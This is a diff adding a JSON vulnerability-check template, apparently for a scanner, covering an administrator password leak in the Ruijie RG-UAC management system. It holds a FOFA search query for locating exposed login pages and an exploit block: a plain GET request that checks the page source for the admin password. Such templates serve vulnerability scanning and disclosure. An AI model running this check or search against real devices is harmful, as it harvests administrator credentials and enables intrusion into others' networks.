@@ -1,0 +1,37 @@
+{
+  "product": "锐捷RG-UAC统一上网行为管理与审计系统",
+  "vul_name": "锐捷RG-UAC统一上网行为管理与审计系统 管理员密码泄露",
+  "type": "信息泄漏",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "锐捷RG-UAC统一上网行为管理审计系统存在信息泄露漏洞，攻击者可以通过审查网页源代码获取到用户账号和密码，导致管理员用户认证信息泄露。",
+  "version": "",
+  "note": "",
+  "search": {
+    "FOFA": "title=\"RG-UAC登录页面\" && body=\"admin\""
+  },
+  "protocol": "http",
+  "link": "https://blog.csdn.net/qq_37113223/article/details/135450668",
+  "fix": [
+    "建议联系软件厂商进行处理。"
+  ],
+  "model": "",
+  "logic": "and",
+  "exploit": {
+    "exp": {
+      "method": "get",
+      "follow": false,
+      "path": "/"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "admin\",\"password\":\""
+        }
+      ]
+    }
+  }
+}
